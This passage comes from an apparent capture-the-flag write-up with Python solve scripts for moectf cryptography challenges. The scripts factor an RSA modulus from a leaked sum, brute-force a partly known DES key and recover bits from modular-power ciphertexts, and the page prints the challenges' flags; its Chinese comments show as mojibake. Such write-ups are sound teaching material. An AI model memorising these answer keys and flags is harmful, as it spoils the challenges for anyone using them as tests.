ValueError(<span class="string">&quot;s not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. è§£ p,q</span></span><br><span class="line"><span class="comment"># s^2 - 4n = (p-q)^2</span></span><br><span class="line">diff2 = s * s - <span class="number">4</span> * n</span><br><span class="line">t = math.isqrt(diff2)</span><br><span class="line"><span class="keyword">if</span> t * t != diff2:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not a square for p-q&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = (s + t) // <span class="number">2</span></span><br><span class="line">q = (s - t) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] q =&quot;</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. è®¡ç®—ç§é’¥ d</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. è§£å¯†</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] FLAG =&quot;</span>, flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">moectf&#123;Ma7hm4t1c5_is_@_k1nd_0f_a2t&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-ez-DES"><a href="#4-ez-DES" class="headerlink" title="4.ez_DES"></a>4.<strong>ez_DES</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥å¯†æ–‡</span></span><br><span class="line">c = <span class="string">b&#x27;\xe6\x8b0\xc8m\t?\x1d\xf6\x99sA&gt;\xce \rN\x83z\xa0\xdc&#123;\xbc\xb8X\xb2\xe2q\xa4&quot;\xfc\x07&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DES key å‰ 5 ä½å·²çŸ¥</span></span><br><span class="line">prefix = <span class="string">&quot;ezdes&quot;</span></span><br><span class="line">charset = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´åä¸‰ä½</span></span><br><span class="line"><span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(charset, repeat=<span class="number">3</span>):</span><br><span class="line">    key_str = prefix + <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">    key = key_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    pt = cipher.decrypt(c)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ£€æŸ¥è§£å¯†ç»“æœ</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;moectf&#123;&quot;</span> <span class="keyword">in</span> pt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Found key:&quot;</span>, key_str)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Plaintext (raw):&quot;</span>, pt)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Plaintext (decoded):&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[+] Found key: ezdes8br</span></span><br><span class="line"><span class="string">[+] Plaintext (raw): b&#x27;moectf&#123;_Ju5t envmEra+e.!&#125;\x19\x19\x19\x19\x19\x19\x19&#x27;</span></span><br><span class="line"><span class="string">[+] Plaintext (decoded): moectf&#123;_Ju5t envmEra+e.!&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-1"><a href="#5-1" class="headerlink" title="5."></a>5.</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># recover_flag.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥å‚æ•°ï¼ˆä»ä½ ç»™å‡ºçš„æ•°æ®ç²˜è´´ï¼‰</span></span><br><span class="line">p = <span class="number">258669765135238783146000574794031096183</span></span><br><span class="line">a = <span class="number">144901483389896508632771215712413815934</span></span><br><span class="line"></span><br><span class="line">ciphertext = [<span class="number">102230607782303286066661803375943337852</span>, <span class="number">196795077203291879584123548614536291210</span>, <span class="number">41820965969318717978206410470942308653</span>, <span class="number">207485265608553973031638961376379316991</span>, <span class="number">126241934830164184030184483965965358511</span>, <span class="number">20250852993510047910828861636740192486</span>, <span class="number">103669039044817273633962139070912140023</span>, <span class="number">97337342479349334554052986501856387313</span>, <span class="number">159127719377115088432849153087501377529</span>, <span class="number">45764236700940832554086668329121194445</span>, <span class="number">35275004033464216369574866255836768148</span>, <span class="number">52905563179465420745275423120979831405</span>, <span class="number">17032180473319795641143474346227445013</span>, <span class="number">29477780450507011415073117531375947096</span>, <span class="number">55487351149573346854028771906741727601</span>, <span class="number">121576510894250531063152466107000055279</span>, <span class="number">69959515052241122548546701060784004682</span>, <span class="number">173839335744520746760315021378911211216</span>, <span class="number">28266103662329817802592951699263023295</span>, <span class="number">194965730205655016437216590690038884309</span>, <span class="number">208284966254343254016582889051763066574</span>, <span class="number">137680272193449000169293006333866420934</span>, <span class="number">250634504150859449051246497912830488025</span>, <span class="number">124228075953362483108097926850143387433</span>, <span class="number">232956176229023369857830577971626577196</span>, <span class="number">149441784891021006224395235471825205661</span>, <span class="number">118758326165875568431376314508740278934</span>, <span class="number">222296215466271835013184903421917936512</span>, <span class="number">49132466023594939909761224481560782731</span>, <span class="number">406286678537520849308828749751513339</span>, <span class="number">215122152883292859254246948661946520324</span>, <span class="number">81283590250399459209567683991648438199</span>, <span class="number">150395133067480380674905743031927410663</span>, <span class="number">5710878479977467762548400320726575491</span>, <span class="number">83627753774286426170934105100463456109</span>, <span class="number">164968224377869331545649899270867630850</span>, <span class="number">241057183685774160581265732812497247167</span>, <span class="number">109136287048010096863680430193408099828</span>, <span class="number">116313129605409961931811582899075031153</span>, <span class="number">202739016625709380026000805340243458300</span>, <span class="number">25408225921774957745573142542576755590</span>, <span class="number">151336258796933656160956289529558246702</span>, <span class="number">2947189044370494063643525166023973095</span>, <span class="number">228678413963736672394976193093568181979</span>, <span class="number">40627063032321835707220414670018641024</span>, <span class="number">55446789315226949622969082042881319148</span>, <span class="number">32219108726651509070669836923591948459</span>, <span class="number">134454924722414419191920784435633637634</span>, <span class="number">97952023967728640730045857104376826039</span>, <span class="number">20659076942504417479953787092276592682</span>, <span class="number">93281761173713729777326842152860901050</span>, <span class="number">133634773495582264000160065317239987936</span>, <span class="number">79976720152435218818731114555425458470</span>, <span class="number">234654694673289327542859971371886984118</span>, <span class="number">51332273108989067644245919615090753756</span>, <span class="number">134120280423303717489979349737802826605</span>, <span class="number">182001158305920226320085758522717203725</span>, <span class="number">98408798757865562737462169470346158516</span>, <span class="number">78200435603900368619334272308272773797</span>, <span class="number">232796357836930341547987600782979821555</span>, <span class="number">589106968861493082018132081244848952</span>, <span class="number">24186003230092331554886767628744415123</span>, <span class="number">236070626491251466741246103662922841423</span>, <span class="number">238699080882667864827094121849090696547</span>, <span class="number">141659873734297659078160283051728812410</span>, <span class="number">228977113517120063860252637394240795552</span>, <span class="number">236613527842969921794004708284265628300</span>, <span class="number">145522034982744654991661857596541755396</span>, <span class="number">249608374387044047328725156440984678776</span>, <span class="number">325110572051913836681821746093704556</span>, <span class="number">171492052199838424502681030556098576483</span>, <span class="number">156498865212994371079795360268866413702</span>, <span class="number">196747701509389071931992996873572785043</span>, <span class="number">70811811603137896158765356680364490781</span>, <span class="number">83672551582385607422240464086955462541</span>, <span class="number">117961603623637997457153763936550310698</span>, <span class="number">224448821395214505399297116719025174412</span>, <span class="number">4598815373009554321735225938200807251</span>, <span class="number">194892269604260726530091473301914449005</span>, <span class="number">127484628022155760909820605666827662175</span>, <span class="number">208706240846212140439291547368645656474</span>, <span class="number">14102286481104997303651684152195298336</span>, <span class="number">6129503335471304345451795609683770657</span>, <span class="number">103799668048593149396277157385628834185</span>, <span class="number">185813375481410513002496683918106238351</span>, <span class="number">233491689316882978147517340230794025796</span>, <span class="number">46274083097168831187719988888816378961</span>, <span class="number">119487551553664772614629936285345836934</span>, <span class="number">84340029922118279362389419277915602509</span>, <span class="number">88253743193124528032223101368846247085</span>, <span class="number">227895357640018330099501504941388167432</span>, <span class="number">92189947144174433744195727086236905626</span>, <span class="number">83114957902192791332190922428847199876</span>, <span class="number">173535754090441937731619031520699325122</span>, <span class="number">192309407933789484835602071782330798398</span>, <span class="number">255421921600128994923738650157598053776</span>, <span class="number">155535082468314012733563336837641958625</span>, <span class="number">49064798421022327310707074253263463055</span>, <span class="number">161216416471071644769301963857685054031</span>, <span class="number">252480348817188872515008985698620059851</span>, <span class="number">75854882798183185741756645038434215611</span>, <span class="number">256065006192683011190132982128640682537</span>, <span class="number">87507510173514424105732562474643251223</span>, <span class="number">163309795132131534875147566536485288212</span>, <span class="number">253583084320404985699510129361746869059</span>, <span class="number">253300112521651972637580307326576568313</span>, <span class="number">239027717080729650738678032571840680727</span>, <span class="number">117444657686971615526398894470673026034</span>, <span class="number">215470942802874046857958621181684551426</span>, <span class="number">58767098748728136687851735836323448020</span>, <span class="number">249357164697409977883764098879705065535</span>, <span class="number">174705348385893117518084017669958647345</span>, <span class="number">211108767177375215605155301209259781232</span>, <span class="number">57829566748907062397366819001461941421</span>, <span class="number">88265742700024922112974862134385921564</span>, <span class="number">80952107622167923709226013231566882261</span>, <span class="number">236078582132483864916117213281193714198</span>, <span class="number">193448482646563141692726575550417225891</span>, <span class="number">245972799166806058223048506073553726233</span>, <span class="number">10132977708896091601871557249244373666</span>, <span class="number">201785418152654519825849206312616081028</span>, <span class="number">15169816744048531212384271865884567710</span>, <span class="number">122545328290385950043826822277924297182</span>, <span class="number">202918646192255177261567701479991753600</span>, <span class="number">32696887488223731055835744711207261936</span>, <span class="number">88319352182963224921157305627381030375</span>, <span class="number">92381505322264045777004475690398861771</span>, <span class="number">189745654013352563126968415157143821842</span>, <span class="number">152254915005998949299817641843658795579</span>, <span class="number">198032433618991362619448347415342295581</span>, <span class="number">84073892809321676935569114878067118319</span>, <span class="number">82243805869584256211699602267760745768</span>, <span class="number">61994229948266781537191603999495995852</span>, <span class="number">253668765227759797787675352833142466255</span>, <span class="number">38865376724677211964966907748953557125</span>, <span class="number">134615436811268347303232550777225944929</span>, <span class="number">176932422465426107783498083830285780588</span>, <span class="number">207573742393618910694054452362826628208</span>, <span class="number">200033130835394442710748301293534928706</span>, <span class="number">127536063935293533700918451145963158658</span>, <span class="number">219125698281820710910675956971948816959</span>, <span class="number">179795893258398750139395156587561075767</span>, <span class="number">69649628109726874051635160004398498964</span>, <span class="number">241433717681314766463039563422535023524</span>, <span class="number">202664264135718511331695232476272832350</span>, <span class="number">205151096657425932591242432052912914182</span>, <span class="number">210305712465948130683966275157181140301</span>, <span class="number">196555690055906934925300527324955477733</span>, <span class="number">66817932643964538216259564711698986077</span>, <span class="number">95270796440975607179107356182889534333</span>, <span class="number">123226880424532374188134357659879826495</span>, <span class="number">53506495440223773538415807620524749240</span>, <span class="number">19253217887083870834249774316467647628</span>, <span class="number">165699356396365023442008488156823647206</span>, <span class="number">107809175498119862854792975070673056027</span>, <span class="number">250453989887421415931162217952559757164</span>, <span class="number">171492052199838424502681030556098576483</span>, <span class="number">133778166882550119563444625306816232463</span>, <span class="number">149009301604122447269581792013291889175</span>, <span class="number">9982418254629616281350713836647603294</span>, <span class="number">203486292122499140756846060502464655972</span>, <span class="number">157686696123400087437836943220926921848</span>, <span class="number">88338919773540412238116717043122711811</span>, <span class="number">113265824169274322024623493892867211478</span>, <span class="number">5549372099744960679418616304893848801</span>, <span class="number">12431828907518852062050349123660880165</span>, <span class="number">183957934738536914983862053251433028750</span>, <span class="number">42027289270308356303682029801998790750</span>, <span class="number">117406080036483925915502666019795783905</span>, <span class="number">154312255292300186042636734144948304054</span>, <span class="number">143706917273862261295046346995206133170</span>, <span class="number">50088136095338601440516112338120787526</span>, <span class="number">250634504150859449051246497912830488025</span>, <span class="number">8073010289877796888705519374892639903</span>, <span class="number">40049582814576788803483039836229025416</span>, <span class="number">227012342545923833983403067401561291645</span>, <span class="number">201776603581414625783054400184026088994</span>, <span class="number">55474945478884522762318445841998187357</span>, <span class="number">221515530211550293408010846844218019597</span>, <span class="number">172650752042211610909190315288155597255</span>, <span class="number">67046194931321172530462444254204111483</span>, <span class="number">207435868835185636819659137800256834557</span>, <span class="number">188063222224545200294767050268070647452</span>, <span class="number">58099349021260301211275261896736590564</span>, <span class="number">23598877596106927870697531042828774738</span>, <span class="number">58546308516383335224739442370238545000</span>, <span class="number">58125311541947998710088435169901475101</span>, <span class="number">238219925698115060748249043752036454438</span>, <span class="number">203910234934340893915761800653823457631</span>, <span class="number">190854889967769152565565000250829375099</span>, <span class="number">37573623890629846209257307181880876288</span>, <span class="number">226220240200270623843038279593586687278</span>, <span class="number">144246075981535671790438155977352345487</span>, <span class="number">14665770553338784222331493932533448756</span>, <span class="number">37992062606775322664977502677838074649</span>, <span class="number">47370175759976523832233910009306151684</span>, <span class="number">97047813247943880266351445874642842468</span>, <span class="number">237607444658797800072728280983357541134</span>, <span class="number">174853113478993738890584814806707459112</span>, <span class="number">17104608155861584438824639050715857607</span>, <span class="number">83639027011494777283064583268678718843</span>, <span class="number">237826165608708003941944469905843354705</span>, <span class="number">231707683915242052796886276983724691027</span>, <span class="number">146089830852925550139294146760718642221</span>, <span class="number">25604562707667550478623425477029052785</span>, <span class="number">108577663147976992047614498924706939204</span>, <span class="number">69040319834829375335287614995435269276</span>, <span class="number">169933229202934375632745753379104389929</span>, <span class="number">72693008284867494808267387710985847974</span>, <span class="number">158548279589965576940349068403862889270</span>, <span class="number">49458101234256610254825879149914255140</span>, <span class="number">24389558269688411084589654047215902968</span>, <span class="number">210567980379246548727819953025607019254</span>, <span class="number">110423375132252997825868399832298953831</span>, <span class="number">109589895677661968369424757992411668628</span>, <span class="number">66177577069199763925999718357846633613</span>, <span class="number">83602293803708828242273186265396676466</span>, <span class="number">172226271050176278536911356541786290551</span>, <span class="number">85799805809703976643034084477579915867</span>, <span class="number">179399990302447560847151603157937241688</span>, <span class="number">81687654752229170984692833277072534294</span>, <span class="number">160766441640281044008645821822296569868</span>, <span class="number">100306680611749750243920501921769642984</span>, <span class="number">42195187332833922597871030332905266026</span>, <span class="number">238918420772178508359295233180536910768</span>, <span class="number">221685929158944699801776621298532178665</span>, <span class="number">209349638787804999657456057184702655805</span>, <span class="number">183953393268431043006359511952782903516</span>, <span class="number">137364333131365794683132159746962959967</span>, <span class="number">15637689373906596015395350692459218048</span>, <span class="number">145956368418289159411911667337899986262</span>, <span class="number">197987711355277581048877821432652325207</span>, <span class="number">125421308989313724733467092345532539875</span>, <span class="number">90525081516582408488547894471421476595</span>, <span class="number">107405840115256692042814887586009104950</span>, <span class="number">71587500700172519801649824611045199280</span>, <span class="number">10155721246869986043302768283257682883</span>, <span class="number">100522792569358427133597834727509523742</span>, <span class="number">244473925018526409824670892423775482110</span>, <span class="number">50746138425761666610345252577572889037</span>, <span class="number">142188269919422432629363225167297071042</span>, <span class="number">8235113926890598897465093754260801947</span>, <span class="number">174540885017405784646782293055852044631</span>, <span class="number">171949847901434672429841435895697323702</span>, <span class="number">34391199559497599434575002007581170988</span>, <span class="number">7337868660819385932166025474594964373</span>, <span class="number">89608475952042154068811282935241824949</span>, <span class="number">162561097613906905390170334328135062933</span>, <span class="number">252566077272083954707900007055640560669</span>, <span class="number">4284637988579219107997224848114896904</span>, <span class="number">220026371387782427901244689037957398829</span>, <span class="number">86019060485320999498155965142619258089</span>, <span class="number">19304861731281576405798605142335886482</span>, <span class="number">123188238667151068575810494833929221938</span>, <span class="number">125089740978532716086813732154638565196</span>, <span class="number">252061524500088702951562270741214799294</span>, <span class="number">89528875472312768404823823905699760649</span>, <span class="number">63307407053590054220492282094909190524</span>, <span class="number">24389558269688411084589654047215902968</span>, <span class="number">43835777110183833958990705735152973942</span>, <span class="number">196543204310466258426232803779025620993</span>, <span class="number">225032412767857179129234169288824097261</span>, <span class="number">50292890880286260984317361296226049436</span>, <span class="number">64928956886509273090981701066528078331</span>, <span class="number">25408225921774957745573142542576755590</span>, <span class="number">235921667882292842303120860570747218086</span>, <span class="number">217132603855089441017750752624514343437</span>, <span class="number">11106129204256119599329380588789107048</span>, <span class="number">147501327490657927610543345089238991876</span>, <span class="number">158091159632919983870444592039392730373</span>, <span class="number">254215886971254771885657857148535673338</span>, <span class="number">129869106474614345624950211566868568809</span>, <span class="number">10425702332274469498479699675668087022</span>, <span class="number">136595953187315682777976356839442311764</span>, <span class="number">1607792140397737044118662059498732982</span>, <span class="number">23710000155612873207506044342091514799</span>, <span class="number">118571340370877720354330132780832828911</span>, <span class="number">194624784476702188629452374731837038856</span>, <span class="number">51332273108989067644245919615090753756</span>, <span class="number">240921043405288511960365826273938845156</span>, <span class="number">158670188709175825212687487436006138030</span>, <span class="number">133641825913283256858340618209700716053</span>, <span class="number">43054466484232130048301271684438593412</span>, <span class="number">20361972967806283315536154125012604660</span>, <span class="number">135700832615866572032111395529532615300</span>, <span class="number">160609169788639387827865051539103507016</span>, <span class="number">100576279475451993660766480883708996211</span>, <span class="number">215424685541583305069271024253690375127</span>, <span class="number">60018956375784961551937423504137141702</span>, <span class="number">107997941230633604720421526632224279451</span>, <span class="number">219482010609171816035007605036664317041</span>, <span class="number">22173526221024380740269311947729076493</span>, <span class="number">249746554302052221287371350978970766087</span>, <span class="number">93207359085331319264650563354951254906</span>, <span class="number">221421697282310997113867048083058096452</span>, <span class="number">61834092635779365101011109381392037516</span>, <span class="number">162215218701897689647766394615098617152</span>, <span class="number">141856131587452385513407955541400099703</span>, <span class="number">177910903795887762773545874929605680469</span>, <span class="number">228832704523723308335513552177377803295</span>, <span class="number">229427981969125094398744034150988525118</span>, <span class="number">217938760689082034514008764751385239765</span>, <span class="number">3238055163645731541423094980789895030</span>, <span class="number">42308449860804765793467328093112118974</span>, <span class="number">254764518926620089428032312378507653680</span>, <span class="number">215733901156118606036318409454786603209</span>, <span class="number">59640829345183339336712595595022506261</span>, <span class="number">33515071724475649656070325837411550208</span>, <span class="number">51175659069843551646353202764296812462</span>, <span class="number">211462959696081863041546889096760952490</span>, <span class="number">230559603938699838189391087728971115767</span>, <span class="number">85878911733601049548471257838175175563</span>, <span class="number">214134904074265214033878852207103328297</span>, <span class="number">160702405980652445507529591230654474171</span>, <span class="number">223755040649990285320102091954198427148</span>, <span class="number">166476753890268002826149533120107157745</span>, <span class="number">26283916639129998224675164834425763384</span>, <span class="number">232971495542024495583092055361321729894</span>, <span class="number">79741799146769724681649849525636816379</span>, <span class="number">228506526471280046809909301748098760369</span>, <span class="number">167502422063741368765891061653686283332</span>, <span class="number">26984184590668253713951516794937308166</span>, <span class="number">105952393031190074432183821281493254</span>, <span class="number">113823192955281698937767041115166174652</span>, <span class="number">93264047694114869263275726820602569731</span>, <span class="number">55481974783112950660682138071588408040</span>, <span class="number">108961894273530837550182447112767144669</span>, <span class="number">47975793549419083945738147934068241928</span>, <span class="number">204024371586357035343484206754422857590</span>, <span class="number">251859351272989525849999231358507018068</span>, <span class="number">75939709807860493804628805619699991501</span>, <span class="number">129031774446142139804436921156668129187</span>, <span class="number">110764318451937254261883856778359218969</span>, <span class="number">246404864722813298477426808193494673610</span>, <span class="number">153818236564405157581869620439634140065</span>, <span class="number">246125932167584353084676586883038397451</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) ç”Ÿæˆå°äº 2^16 çš„ç´ æ•°åˆ—è¡¨ï¼ˆsieveï¼‰</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_primes_upto</span>(<span class="params">n</span>):</span><br><span class="line">    sieve = <span class="built_in">bytearray</span>(<span class="string">b&#x27;\x01&#x27;</span>) * (n+<span class="number">1</span>)</span><br><span class="line">    sieve[<span class="number">0</span>:<span class="number">2</span>] = <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n**<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> sieve[i]:</span><br><span class="line">            step = i</span><br><span class="line">            start = i*i</span><br><span class="line">            sieve[start:n+<span class="number">1</span>:step] = <span class="string">b&#x27;\x00&#x27;</span> * ((n - start)//step + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i, isprime <span class="keyword">in</span> <span class="built_in">enumerate</span>(sieve) <span class="keyword">if</span> isprime]</span><br><span class="line"></span><br><span class="line">primes16 = gen_primes_upto(<span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) æ¢å¤æ¯”ç‰¹ä¸²</span></span><br><span class="line">bits = []</span><br><span class="line">total = <span class="built_in">len</span>(ciphertext)</span><br><span class="line">bases = [a] + [a + d <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>)]  <span class="comment"># a, a+1 .. a+10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx, ci <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertext, <span class="number">1</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># å°è¯•æ¯ä¸ª base ä¸æ¯ä¸ª 16-bit ç´ æ•° e</span></span><br><span class="line">    <span class="keyword">for</span> base_idx, base <span class="keyword">in</span> <span class="built_in">enumerate</span>(bases):</span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> primes16:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(base, e, p) == ci:</span><br><span class="line">                bit = <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> base_idx == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                bits.append(bit)</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="comment"># å¯ä»¥æ‰“å°è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;idx&#125;</span>/<span class="subst">&#123;total&#125;</span>] match: base_index=<span class="subst">&#123;base_idx&#125;</span> (base=<span class="subst">&#123;base <span class="keyword">if</span> base_idx&lt;<span class="number">2</span> <span class="keyword">else</span> <span class="string">&#x27;a+&#x27;</span>+<span class="built_in">str</span>(base-a)&#125;</span>), e=<span class="subst">&#123;e&#125;</span>, bit=<span class="subst">&#123;bit&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="comment"># å¦‚æœæ²¡æ‰¾åˆ°ï¼Œè¯´æ˜æ•°æ®ç²˜è´´æœ‰é—æ¼æˆ–å­˜åœ¨å…¶ä»–éšæœºæ€§ï¼Œæ‰“å°å¹¶ä¸­æ–­</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] No match for ciphertext index <span class="subst">&#123;idx&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span> SystemExit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) æŠŠ bits æ‹¼å› bytes å¹¶è§£ç </span></span><br><span class="line">bitstr = <span class="string">&#x27;&#x27;</span>.join(bits)</span><br><span class="line">bytes_list = [<span class="built_in">int</span>(bitstr[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bitstr), <span class="number">8</span>)]</span><br><span class="line">plaintext = <span class="built_in">bytes</span>(bytes_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered (raw bytes):&quot;</span>, plaintext)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recovered (utf-8):&quot;</span>, plaintext.decode())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recovered (decoded with errors ignored):&quot;</span>, plaintext.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250810010221104.png" alt="image-20250810010221104"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_h@v3_ju5t_s01v3d_7h1s_pr0b13m!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-happy-rsa"><a href="#6-happy-rsa" class="headerlink" title="6.happy rsa"></a>6.happy rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">n = <span class="number">128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886</span></span><br><span class="line">x = <span class="number">522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141</span></span><br><span class="line"></span><br><span class="line">disc = <span class="number">4</span> * x - <span class="number">3</span></span><br><span class="line">sqrt_val = math.isqrt(disc)</span><br><span class="line"><span class="keyword">if</span> sqrt_val ** <span class="number">2</span> == disc:</span><br><span class="line">    s = (sqrt_val - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    phi = n - s</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span 